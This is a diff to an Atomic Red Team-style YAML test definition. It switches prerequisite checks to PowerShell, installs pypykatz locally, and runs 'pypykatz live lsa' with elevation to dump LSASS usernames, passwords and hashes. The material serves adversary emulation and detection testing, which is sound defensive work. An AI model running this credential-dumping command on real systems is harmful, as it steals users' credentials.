@@ -188,13 +188,12 @@ atomic_tests:
     Successful execution of this test will display multiple usernames and passwords/hashes to the screen.
   supported_platforms:
   - windows
-  dependency_executor_name: command_prompt
+  dependency_executor_name: powershell
   dependencies:
   - description: |
       Computer must have python 3 installed
     prereq_command: |
-      py -3 --version >nul 2>&1
-      exit /b %errorlevel%
+      if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
       invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
@@ -202,8 +201,8 @@ atomic_tests:
   - description: |
       Computer must have pip installed
     prereq_command: |
-      py -3 -m pip --version >nul 2>&1
-      exit /b %errorlevel%
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      if (Get-Command pip -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
       invoke-webrequest "https://bootstrap.pypa.io/ez_setup.py" -outfile "PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py"      
@@ -211,25 +210,18 @@ atomic_tests:
       cmd /c "PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py"
       cmd /c "PathToAtomicsFolder\..\ExternalPayloads\get-pip.py"
   - description: |
-     pip-autoremove must be installed 
+      pypykatz must be installed 
     prereq_command: |
-      pip-autoremove -h >nul 2>&1
-      exit /b %errorlevel%
+      cmd /c "PathToAtomicsFolder\..\ExternalPayloads\pypykatz\bin\pypykatz -h > nul 2> nul" 
     get_prereq_command: |
-      pip install pypykatz
-  - description: |
-      pypykatz must be installed and part of PATH
-    prereq_command: |
-      pypykatz -h >nul 2>&1
-      exit /b %errorlevel%
-    get_prereq_command: |
-      pip install pypykatz
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      pip install -t "PathToAtomicsFolder\..\ExternalPayloads\pypykatz" pypykatz
   executor:
     command: |
-      pypykatz live lsa
+      "PathToAtomicsFolder\..\ExternalPayloads\pypykatz\bin\pypykatz" live lsa
     cleanup_command: |
-      del "%temp%\nanodump.dmp" >nul 2> nul
-      pip-autoremove pypykatz >nul 2> nul
+      del "%temp%\nanodump.dmp" > nul 2> nul
+      del /Q "PathToAtomicsFolder\..\ExternalPayloads\pypykatz" >nul 2> nul
     name: command_prompt
     elevation_required: true
 - name: Dump LSASS.exe Memory using Out-Minidump.ps1
